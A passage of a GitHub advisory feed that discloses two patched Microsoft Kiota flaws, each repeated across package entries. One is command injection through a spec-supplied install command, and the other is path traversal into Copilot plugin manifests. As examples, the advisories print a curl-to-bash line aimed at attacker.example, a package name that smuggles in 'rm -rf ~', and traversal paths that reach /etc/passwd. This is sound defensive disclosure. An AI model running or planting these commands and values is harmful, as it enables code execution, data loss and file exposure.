<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-4vv7-jj25-4gh6">https://github.com/microsoft/kiota/security/advisories/GHSA-4vv7-jj25-4gh6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59866">https://nvd.nist.gov/vuln/detail/CVE-2026-59866</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7884">https://github.com/microsoft/kiota/pull/7884</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/dc812dbbf88ef7edf53a890d36b2f9d1460e947d">https://github.com/microsoft/kiota/commit/dc812dbbf88ef7edf53a890d36b2f9d1460e947d</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-4vv7-jj25-4gh6">https://github.com/advisories/GHSA-4vv7-jj25-4gh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vv7-jj25-4gh6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:12:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Microsoft Kiota: Command injection via x-ms-kiota-info dependencyInstallCommand surfaced by `kiota info`]]></title>
        <id>https://github.com/advisories/GHSA-hq9q-27g5-qwpj</id>
        <link href="https://github.com/advisories/GHSA-hq9q-27g5-qwpj"/>
        <updated>2026-08-17T14:55:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>kiota info</code> — the command developers run to learn which packages to install after generating a client —
read the <code>x-ms-kiota-info</code> extension from the OpenAPI description and presented the spec-supplied
<code>dependencyInstallCommand</code> (and dependency <code>name</code>/<code>version</code>) <strong>as the tool's own recommended install
command</strong>, replacing kiota's normally-trusted suggestion. With an attacker-controlled or compromised
description:</p>
<pre><code>$ kiota info -d &lt;attacker-spec&gt; -l CSharp
   ...
   Hint: use the install command to install the dependencies.
   Example:
      curl -s https://attacker.example/x.sh | bash   # attacker-controlled
</code></pre>
<p>A developer who followed kiota's explicit instruction (run the suggested install command) executed
attacker-controlled shell — <strong>command injection → RCE</strong>. The IDE-facing <code>kiota info --json</code> output, which the
Kiota <strong>VS Code extension</strong> consumes to offer/run dependency installation, exposed the raw command string
directly, so an "install dependencies" action in the IDE could run it automatically.</p>
<p>Confirmed on Kiota <strong>1.32.4</strong>.</p>
<h3 id="details">Details</h3>
<p><code>x-ms-kiota-info.languagesInformation.&lt;language&gt;.dependencyInstallCommand</code> was emitted verbatim as the
install-command example, and <code>dependencies[].name</code>/<code>version</code> were shown verbatim in the package table:</p>
<pre><code># spec
x-ms-kiota-info:
  languagesInformation:
    CSharp:
      dependencyInstallCommand: "curl -s https://attacker.example/x.sh | bash"
      dependencies: [{ name: "Evil.Pkg; rm -rf ~", version: "1.0.0", type: bundle }]
</code></pre>
<p>Without <code>x-ms-kiota-info</code>, kiota suggests its own trusted command (e.g.
<code>dotnet add package Microsoft.Kiota.Authentication.Azure --version 2.0.0</code>); the spec's value <strong>replaced</strong> it.
<code>kiota info --json</code> (consumed by the Kiota VS Code extension) emitted the attacker command in
<code>dependencyInstallCommand</code>.</p>
<h3 id="impact">Impact</h3>
<p>A developer who ran <code>kiota info</code> on an attacker-controlled or compromised OpenAPI description and followed
kiota's instruction to run the suggested install command executed arbitrary shell on their workstation or CI
host. The Kiota VS Code extension, which surfaced/ran <code>dependencyInstallCommand</code> from the <code>--json</code> output,
could make this automatic. CWE-94 / CWE-829.</p>
<p>Precondition: the description is from an untrusted source (or a trusted one that was tampered with), and the
recommended command is run (manually per kiota's hint, or by the IDE).</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7883">https://github.com/microsoft/kiota/pull/7883</a>). Support for the spec-supplied
<code>dependencyInstallCommand</code> in <code>x-ms-kiota-info</code> was <strong>removed</strong> entirely: <code>kiota info</code> no longer reads or
presents a description-provided install command and only surfaces kiota's own built-in, package-manager
templates. The <code>--json</code> output no longer carries a spec-controlled command string for the IDE to run.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later. Update the Kiota VS Code extension to a version built against 1.32.5+.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj">https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59865">https://nvd.nist.gov/vuln/detail/CVE-2026-59865</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7883">https://github.com/microsoft/kiota/pull/7883</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6">https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-hq9q-27g5-qwpj">https://github.com/advisories/GHSA-hq9q-27g5-qwpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq9q-27g5-qwpj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T16:11:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Command injection via x-ms-kiota-info dependencyInstallCommand surfaced by `kiota info`]]></title>
        <id>https://github.com/advisories/GHSA-hq9q-27g5-qwpj</id>
        <link href="https://github.com/advisories/GHSA-hq9q-27g5-qwpj"/>
        <updated>2026-08-17T14:55:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>kiota info</code> — the command developers run to learn which packages to install after generating a client —
read the <code>x-ms-kiota-info</code> extension from the OpenAPI description and presented the spec-supplied
<code>dependencyInstallCommand</code> (and dependency <code>name</code>/<code>version</code>) <strong>as the tool's own recommended install
command</strong>, replacing kiota's normally-trusted suggestion. With an attacker-controlled or compromised
description:</p>
<pre><code>$ kiota info -d &lt;attacker-spec&gt; -l CSharp
   ...
   Hint: use the install command to install the dependencies.
   Example:
      curl -s https://attacker.example/x.sh | bash   # attacker-controlled
</code></pre>
<p>A developer who followed kiota's explicit instruction (run the suggested install command) executed
attacker-controlled shell — <strong>command injection → RCE</strong>. The IDE-facing <code>kiota info --json</code> output, which the
Kiota <strong>VS Code extension</strong> consumes to offer/run dependency installation, exposed the raw command string
directly, so an "install dependencies" action in the IDE could run it automatically.</p>
<p>Confirmed on Kiota <strong>1.32.4</strong>.</p>
<h3 id="details">Details</h3>
<p><code>x-ms-kiota-info.languagesInformation.&lt;language&gt;.dependencyInstallCommand</code> was emitted verbatim as the
install-command example, and <code>dependencies[].name</code>/<code>version</code> were shown verbatim in the package table:</p>
<pre><code># spec
x-ms-kiota-info:
  languagesInformation:
    CSharp:
      dependencyInstallCommand: "curl -s https://attacker.example/x.sh | bash"
      dependencies: [{ name: "Evil.Pkg; rm -rf ~", version: "1.0.0", type: bundle }]
</code></pre>
<p>Without <code>x-ms-kiota-info</code>, kiota suggests its own trusted command (e.g.
<code>dotnet add package Microsoft.Kiota.Authentication.Azure --version 2.0.0</code>); the spec's value <strong>replaced</strong> it.
<code>kiota info --json</code> (consumed by the Kiota VS Code extension) emitted the attacker command in
<code>dependencyInstallCommand</code>.</p>
<h3 id="impact">Impact</h3>
<p>A developer who ran <code>kiota info</code> on an attacker-controlled or compromised OpenAPI description and followed
kiota's instruction to run the suggested install command executed arbitrary shell on their workstation or CI
host. The Kiota VS Code extension, which surfaced/ran <code>dependencyInstallCommand</code> from the <code>--json</code> output,
could make this automatic. CWE-94 / CWE-829.</p>
<p>Precondition: the description is from an untrusted source (or a trusted one that was tampered with), and the
recommended command is run (manually per kiota's hint, or by the IDE).</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7883">https://github.com/microsoft/kiota/pull/7883</a>). Support for the spec-supplied
<code>dependencyInstallCommand</code> in <code>x-ms-kiota-info</code> was <strong>removed</strong> entirely: <code>kiota info</code> no longer reads or
presents a description-provided install command and only surfaces kiota's own built-in, package-manager
templates. The <code>--json</code> output no longer carries a spec-controlled command string for the IDE to run.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later. Update the Kiota VS Code extension to a version built against 1.32.5+.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj">https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59865">https://nvd.nist.gov/vuln/detail/CVE-2026-59865</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7883">https://github.com/microsoft/kiota/pull/7883</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6">https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-hq9q-27g5-qwpj">https://github.com/advisories/GHSA-hq9q-27g5-qwpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq9q-27g5-qwpj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T16:11:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Microsoft Kiota: Command injection via x-ms-kiota-info dependencyInstallCommand surfaced by `kiota info`]]></title>
        <id>https://github.com/advisories/GHSA-hq9q-27g5-qwpj</id>
        <link href="https://github.com/advisories/GHSA-hq9q-27g5-qwpj"/>
        <updated>2026-08-17T14:55:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>kiota info</code> — the command developers run to learn which packages to install after generating a client —
read the <code>x-ms-kiota-info</code> extension from the OpenAPI description and presented the spec-supplied
<code>dependencyInstallCommand</code> (and dependency <code>name</code>/<code>version</code>) <strong>as the tool's own recommended install
command</strong>, replacing kiota's normally-trusted suggestion. With an attacker-controlled or compromised
description:</p>
<pre><code>$ kiota info -d &lt;attacker-spec&gt; -l CSharp
   ...
   Hint: use the install command to install the dependencies.
   Example:
      curl -s https://attacker.example/x.sh | bash   # attacker-controlled
</code></pre>
<p>A developer who followed kiota's explicit instruction (run the suggested install command) executed
attacker-controlled shell — <strong>command injection → RCE</strong>. The IDE-facing <code>kiota info --json</code> output, which the
Kiota <strong>VS Code extension</strong> consumes to offer/run dependency installation, exposed the raw command string
directly, so an "install dependencies" action in the IDE could run it automatically.</p>
<p>Confirmed on Kiota <strong>1.32.4</strong>.</p>
<h3 id="details">Details</h3>
<p><code>x-ms-kiota-info.languagesInformation.&lt;language&gt;.dependencyInstallCommand</code> was emitted verbatim as the
install-command example, and <code>dependencies[].name</code>/<code>version</code> were shown verbatim in the package table:</p>
<pre><code># spec
x-ms-kiota-info:
  languagesInformation:
    CSharp:
      dependencyInstallCommand: "curl -s https://attacker.example/x.sh | bash"
      dependencies: [{ name: "Evil.Pkg; rm -rf ~", version: "1.0.0", type: bundle }]
</code></pre>
<p>Without <code>x-ms-kiota-info</code>, kiota suggests its own trusted command (e.g.
<code>dotnet add package Microsoft.Kiota.Authentication.Azure --version 2.0.0</code>); the spec's value <strong>replaced</strong> it.
<code>kiota info --json</code> (consumed by the Kiota VS Code extension) emitted the attacker command in
<code>dependencyInstallCommand</code>.</p>
<h3 id="impact">Impact</h3>
<p>A developer who ran <code>kiota info</code> on an attacker-controlled or compromised OpenAPI description and followed
kiota's instruction to run the suggested install command executed arbitrary shell on their workstation or CI
host. The Kiota VS Code extension, which surfaced/ran <code>dependencyInstallCommand</code> from the <code>--json</code> output,
could make this automatic. CWE-94 / CWE-829.</p>
<p>Precondition: the description is from an untrusted source (or a trusted one that was tampered with), and the
recommended command is run (manually per kiota's hint, or by the IDE).</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7883">https://github.com/microsoft/kiota/pull/7883</a>). Support for the spec-supplied
<code>dependencyInstallCommand</code> in <code>x-ms-kiota-info</code> was <strong>removed</strong> entirely: <code>kiota info</code> no longer reads or
presents a description-provided install command and only surfaces kiota's own built-in, package-manager
templates. The <code>--json</code> output no longer carries a spec-controlled command string for the IDE to run.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later. Update the Kiota VS Code extension to a version built against 1.32.5+.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj">https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59865">https://nvd.nist.gov/vuln/detail/CVE-2026-59865</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7883">https://github.com/microsoft/kiota/pull/7883</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6">https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-hq9q-27g5-qwpj">https://github.com/advisories/GHSA-hq9q-27g5-qwpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq9q-27g5-qwpj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T16:11:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Command injection via x-ms-kiota-info dependencyInstallCommand surfaced by `kiota info`]]></title>
        <id>https://github.com/advisories/GHSA-hq9q-27g5-qwpj</id>
        <link href="https://github.com/advisories/GHSA-hq9q-27g5-qwpj"/>
        <updated>2026-08-17T14:55:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>kiota info</code> — the command developers run to learn which packages to install after generating a client —
read the <code>x-ms-kiota-info</code> extension from the OpenAPI description and presented the spec-supplied
<code>dependencyInstallCommand</code> (and dependency <code>name</code>/<code>version</code>) <strong>as the tool's own recommended install
command</strong>, replacing kiota's normally-trusted suggestion. With an attacker-controlled or compromised
description:</p>
<pre><code>$ kiota info -d &lt;attacker-spec&gt; -l CSharp
   ...
   Hint: use the install command to install the dependencies.
   Example:
      curl -s https://attacker.example/x.sh | bash   # attacker-controlled
</code></pre>
<p>A developer who followed kiota's explicit instruction (run the suggested install command) executed
attacker-controlled shell — <strong>command injection → RCE</strong>. The IDE-facing <code>kiota info --json</code> output, which the
Kiota <strong>VS Code extension</strong> consumes to offer/run dependency installation, exposed the raw command string
directly, so an "install dependencies" action in the IDE could run it automatically.</p>
<p>Confirmed on Kiota <strong>1.32.4</strong>.</p>
<h3 id="details">Details</h3>
<p><code>x-ms-kiota-info.languagesInformation.&lt;language&gt;.dependencyInstallCommand</code> was emitted verbatim as the
install-command example, and <code>dependencies[].name</code>/<code>version</code> were shown verbatim in the package table:</p>
<pre><code># spec
x-ms-kiota-info:
  languagesInformation:
    CSharp:
      dependencyInstallCommand: "curl -s https://attacker.example/x.sh | bash"
      dependencies: [{ name: "Evil.Pkg; rm -rf ~", version: "1.0.0", type: bundle }]
</code></pre>
<p>Without <code>x-ms-kiota-info</code>, kiota suggests its own trusted command (e.g.
<code>dotnet add package Microsoft.Kiota.Authentication.Azure --version 2.0.0</code>); the spec's value <strong>replaced</strong> it.
<code>kiota info --json</code> (consumed by the Kiota VS Code extension) emitted the attacker command in
<code>dependencyInstallCommand</code>.</p>
<h3 id="impact">Impact</h3>
<p>A developer who ran <code>kiota info</code> on an attacker-controlled or compromised OpenAPI description and followed
kiota's instruction to run the suggested install command executed arbitrary shell on their workstation or CI
host. The Kiota VS Code extension, which surfaced/ran <code>dependencyInstallCommand</code> from the <code>--json</code> output,
could make this automatic. CWE-94 / CWE-829.</p>
<p>Precondition: the description is from an untrusted source (or a trusted one that was tampered with), and the
recommended command is run (manually per kiota's hint, or by the IDE).</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7883">https://github.com/microsoft/kiota/pull/7883</a>). Support for the spec-supplied
<code>dependencyInstallCommand</code> in <code>x-ms-kiota-info</code> was <strong>removed</strong> entirely: <code>kiota info</code> no longer reads or
presents a description-provided install command and only surfaces kiota's own built-in, package-manager
templates. The <code>--json</code> output no longer carries a spec-controlled command string for the IDE to run.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later. Update the Kiota VS Code extension to a version built against 1.32.5+.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj">https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59865">https://nvd.nist.gov/vuln/detail/CVE-2026-59865</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7883">https://github.com/microsoft/kiota/pull/7883</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6">https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-hq9q-27g5-qwpj">https://github.com/advisories/GHSA-hq9q-27g5-qwpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq9q-27g5-qwpj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T16:11:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Microsoft Kiota: Path/URL injection into generated Copilot plugin manifest via x-ai-* extensions]]></title>
        <id>https://github.com/advisories/GHSA-4jwf-m4wg-8p66</id>
        <link href="https://github.com/advisories/GHSA-4jwf-m4wg-8p66"/>
        <updated>2026-08-17T14:54:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>kiota plugin add</code> / <code>kiota plugin generate</code> (with <code>-t APIPlugin</code>) emits an attacker-controlled <code>static_template.file</code> path from the AI-plugin extensions (<code>x-ai-adaptive-card</code>, <code>x-ai-capabilities</code>) <strong>verbatim</strong>, with no path validation, into the generated Microsoft 365 Copilot / Teams plugin manifest (<code>&lt;name&gt;-apiplugin.json</code>). An attacker-controlled or compromised OpenAPI description can therefore embed a <code>../</code> / absolute path into the manifest's <code>response_semantics.static_template.file</code>, yielding a <strong>path traversal (CWE-22)</strong> / out-of-package file inclusion (CWE-829) that is resolved by the AI host when the generated plugin is deployed.</p>
<p>Confirmed on Kiota <strong>1.32.4</strong> (<code>KIOTA_CONFIG_PREVIEW=true</code>, the self-contained <code>linux-x64</code> release binary).</p>
<h3 id="details">Details</h3>
<p>Both extension paths write the <code>static_template.file</code> reference straight into the manifest without sanitization — <code>PluginsGenerationService.GetResponseSemanticsFromAdaptiveCardExtension</code> mints <code>static_template = {"file": &lt;File&gt;}</code>, and the <code>x-ai-capabilities</code> path copies the <code>static_template</code> object through:</p>
<pre><code># spec                                                  -&gt; generated manifest (functions[].capabilities.response_semantics)
x-ai-adaptive-card: {title: T, data_path: $.x,
   file: "../../../../../../etc/passwd"}                -&gt; static_template.file = "../../../../../../etc/passwd"   (CWE-22)
x-ai-capabilities.response_semantics.static_template:
   {file: "../../../../../../etc/passwd"}               -&gt; static_template.file = "../../../../../../etc/passwd"   (CWE-22)
</code></pre>
<p>(<code>x-ai-adaptive-card.file</code> only reaches the manifest when <code>title</code> is set, so <code>GetResponseSemanticsFromAdaptiveCardExtension</code> fires; otherwise kiota writes its own template card instead.)</p>
<h3 id="impact">Impact</h3>
<p><strong>This is not local code execution on the build host.</strong> The injected path is written into the generated plugin manifest and realized <strong>downstream</strong>, when the plugin is packaged and sideloaded / deployed to an AI host (Microsoft 365 Copilot / Teams) that resolves <code>static_template.file</code> relative to the plugin package (out-of-package file reference via <code>../</code>). Kiota is the propagation point: it fails to reject <code>../</code> and absolute paths in this provider-supplied field before writing it into the manifest.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7892">https://github.com/microsoft/kiota/pull/7892</a>). <code>static_template.file</code> from both <code>x-ai-adaptive-card</code> and <code>x-ai-capabilities</code> is validated as a relative path confined to the plugin output package: absolute URIs, rooted/UNC paths, Windows drive paths, and <code>..</code> traversal segments are rejected, and unsafe references are dropped with a warning. Regression tests cover <code>..</code>, absolute paths, and URI values.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5</strong> or later and regenerate affected plugins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-4jwf-m4wg-8p66">https://github.com/microsoft/kiota/security/advisories/GHSA-4jwf-m4wg-8p66</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59864">https://nvd.nist.gov/vuln/detail/CVE-2026-59864</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7892">https://github.com/microsoft/kiota/pull/7892</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/9a185994a4e549b7bba3cc2beffb9736aa902e79">https://github.com/microsoft/kiota/commit/9a185994a4e549b7bba3cc2beffb9736aa902e79</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-4jwf-m4wg-8p66">https://github.com/advisories/GHSA-4jwf-m4wg-8p66</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4jwf-m4wg-8p66</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T15:58:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Path/URL injection into generated Copilot plugin manifest via x-ai-* extensions]]></title>
        <id>https://github.com/advisories/GHSA-4jwf-m4wg-8p66</id>
        <link href="https://github.com/advisories/GHSA-4jwf-m4wg-8p66"/>
        <updated>2026-08-17T14:54:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>kiota plugin add</code> / <code>kiota plugin generate</code> (with <code>-t APIPlugin</code>) emits an attacker-controlled <code>static_template.file</code> path from the AI-plugin extensions (<code>x-ai-adaptive-card</code>, <code>x-ai-capabilities</code>) <strong>verbatim</strong>, with no path validation, into the generated Microsoft 365 Copilot / Teams plugin manifest (<code>&lt;name&gt;-apiplugin.json</code>). An attacker-controlled or compromised OpenAPI description can therefore embed a <code>../</code> / absolute path into the manifest's <code>response_semantics.static_template.file</code>, yielding a <strong>path traversal (CWE-22)</strong> / out-of-package file inclusion (CWE-829) that is resolved by the AI host when the generated plugin is deployed.</p>
<p>Confirmed on Kiota <strong>1.32.4</strong> (<code>KIOTA_CONFIG_PREVIEW=true</code>, the self-contained <code>linux-x64</code> release binary).</p>
<h3 id="details">Details</h3>
<p>Both extension paths write the <code>static_template.file</code> reference straight into the manifest without sanitization — <code>PluginsGenerationService.GetResponseSemanticsFromAdaptiveCardExtension</code> mints <code>static_template = {"file": &lt;File&gt;}</code>, and the <code>x-ai-capabilities</code> path copies the <code>static_template</code> object through:</p>
<pre><code># spec                                                  -&gt; generated manifest (functions[].capabilities.response_semantics)
x-ai-adaptive-card: {title: T, data_path: $.x,
   file: "../../../../../../etc/passwd"}                -&gt; static_template.file = "../../../../../../etc/passwd"   (CWE-22)
x-ai-capabilities.response_semantics.static_template:
   {file: "../../../../../../etc/passwd"}               -&gt; static_template.file = "../../../../../../etc/passwd"   (CWE-22)
</code></pre>
<p>(<code>x-ai-adaptive-card.file</code> only reaches the manifest when <code>title</code> is set, so <code>GetResponseSemanticsFromAdaptiveCardExtension</code> fires; otherwise kiota writes its own template card instead.)</p>
<h3 id="impact">Impact</h3>
<p><strong>This is not local code execution on the build host.</strong> The injected path is written into the generated plugin manifest and realized <strong>downstream</strong>, when the plugin is packaged and sideloaded / deployed to an AI host (Microsoft 365 Copilot / Teams) that resolves <code>static_template.file</code> relative to the plugin package (out-of-package file reference via <code>../</code>). Kiota is the propagation point: it fails to reject <code>../</code> and absolute paths in this provider-supplied field before writing it into the manifest.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7892">https://github.com/microsoft/kiota/pull/7892</a>). <code>static_template.file</code> from both <code>x-ai-adaptive-card</code> and <code>x-ai-capabilities</code> is validated as a relative path confined to the plugin output package: absolute URIs, rooted/UNC paths, Windows drive paths, and <code>..</code> traversal segments are rejected, and unsafe references are dropped with a warning. Regression tests cover <code>..</code>, absolute paths, and URI values.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5</strong> or later and regenerate affected plugins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-4jwf-m4wg-8p66">https://github.com/microsoft/kiota/security/advisories/GHSA-4jwf-m4wg-8p66</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59864">https://nvd.nist.gov/vuln/detail/CVE-2026-59864</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7892">https://github.com/microsoft/kiota/pull/7892</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/9a185994a4e549b7bba3cc2beffb9736aa902e79">https://github.com/microsoft/kiota/commit/9a185994a4e549b7bba3cc2beffb9736aa902e79</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-4jwf-m4wg-8p66">https://github.com/advisories/GHSA-4jwf-m4wg-8p66</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4jwf-m4wg-8p66</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T15:58:31.000Z</published>
    </entry>
</feed>